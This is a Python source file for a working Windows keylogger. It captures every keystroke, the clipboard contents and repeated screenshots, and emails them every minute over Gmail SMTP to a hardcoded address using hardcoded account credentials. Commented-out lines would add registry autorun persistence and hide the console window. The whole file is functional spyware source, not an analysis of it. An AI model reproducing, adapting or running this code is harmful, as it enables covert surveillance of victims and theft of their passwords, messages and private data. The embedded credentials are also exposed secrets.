import os
from pickle import FALSE
import time
import keyboard # for keylogs
import smtplib
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.header import Header
# Timer is to make a method runs after an `interval` amount of time
from threading import Timer
from datetime import datetime
import getpass
import pyperclip
import pyautogui
import ctypes
import autorun
import win32process
import  shutil

# autorun.AddToRegistry()
# hwnd = ctypes.windll.kernel32.GetConsoleWindow()      
# if hwnd != 0:      
#     ctypes.windll.user32.ShowWindow(hwnd, 0)      
#     ctypes.windll.kernel32.CloseHandle(hwnd)
#     _, pid = win32process.GetWindowThreadProcessId(hwnd)



print('program started')
img_count = 1

def main_func():
    SEND_REPORT_EVERY = 60 # in seconds, 60 means 1 minute and so on
    # EMAIL_ADDRESS = "Shalinitiwari1098@gmail.com"
    # EMAIL_PASSWORD = "abcd@1234"
    EMAIL_ADDRESS = "core.builder11@gmail.com"
    EMAIL_PASSWORD = "builder123*"

    class Keylogger:
        def __init__(self, interval, report_method="email"):
            # we gonna pass SEND_REPORT_EVERY to interval
            self.interval = interval
            self.report_method = report_method
            # this is the string variable that contains the log of all 
            # the keystrokes within `self.interval`
            self.log = ""
            # record start & end datetimes
            self.start_dt = datetime.now()
            self.end_dt = datetime.now()

        def callback(self, event):
            """
            This callback is invoked whenever a keyboard event is occured
            (i.e when a key is released in this example)
            """
            name = event.name
            if len(name) > 1:
                if name == "space":
                    # " " instead of "space"
                    name = " "
                elif name == "enter":
                    # add a new line whenever an ENTER is pressed
                    name = "[ENTER]\n"
                # elif name == "backspace":
                #     self.log[:-1]
                #     name = ''
                elif name == "decimal":
                    name = "."
                else:
                    # replace spaces with underscores
                    name = name.replace(" ", "_")
                    name = f"[{name.upper()}]"
            # finally, add the key name to our global `self.log` variable
            self.log += name
        
        def update_filename(self):
            # construct the filename to be identified by start & end datetimes
            start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
            end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
            self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

        def report_to_file(self):
            """This method creates a log file in the current directory that contains
            the current keylogs in the `self.log` variable"""
            # open the file in write mode (create it)
            with open(f"{self.filename}.txt", "w") as f:
                # write the keylogs to the file
                print(self.log, file=f)
            print(f"[+] Saved {self.filename}.txt")

        def sendmail(self, email, password, message):
            if not os.path.exists(os.path.join('C://', 'temp')):
                os.mkdir(os.path.join('C://', 'temp'))
            # _ss_func()
            msg = MIMEMultipart("related")
            msg["Subject"] = f'Device Name: \n{getpass.getuser()}\n\n'
            email_body = '\n\nClipboard data:\n'  + pyperclip.paste() + '\n\n\n\n' + message
            msg["From"] = email
            # msg["To"] = 'core.builder11@gmail.com'
            # Anshumankumar7890@gmail.com
            msg.attach(MIMEText(email_body))
            for i in range(1,4):
                time.sleep(5)
                ss = pyautogui.screenshot()
                ss.save(f'C://temp/log{i}.png')
                with open(f'C://temp/log{i}.png', 'rb') as fp:
                    img = MIMEImage(fp.read())
                img.add_header('Content-ID', '<{}>'.format(f'C://temp/log{i}.png'))
                msg.attach(img)
            # if self._attachimg(1):
            # if self._attachimg(2):
            #     msg.attach(self._attachimg(2))
            # if self._attachimg(3):
            #     msg.attach(self._attachimg(3))
            # if self._attachimg(4):
            #     msg.attach(self._attachimg(4))
            print('sending email...')
            # manages a connection to an SMTP server
            server = smtplib.SMTP(host="smtp.gmail.com", port=587)
            # # connect to the SMTP server as TLS mode ( for security )
            server.starttls()
            # login to the email account
            server.login(email, password)
            # send the actual message
            server.sendmail(email, 'core.builder11@gmail.com',msg.as_string())
            print('email sent successfully')
            # terminates the session
            server.quit()
            # os.remove('C://temp/')
            shutil.rmtree('C://temp')

        def report(self):
            # if self.log:
                # if there is something in log, report it
            self.end_dt = datetime.now()
            # update `self.filename`
            self.update_filename()
            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method == "file":
                self.report_to_file()
            # if you want to print in the console, uncomment below line
            print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
            self.log = ""
            timer = Timer(interval=self.interval, function=self.report)
            # set the thread as daemon (dies when main thread die)
            timer.daemon = True
            # start the timer
            timer.start()

        def start(self):
            # record the start datetime
            self.start_dt = datetime.now()
            # start the keylogger
            keyboard.on_release(callback=self.callback)
            # start reporting the keylogs
            self.report()
            # block the current thread, wait until CTRL+C is pressed
            keyboard.wait()

        
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
    keylogger.start()    
    # _ss_func()
     
main_func()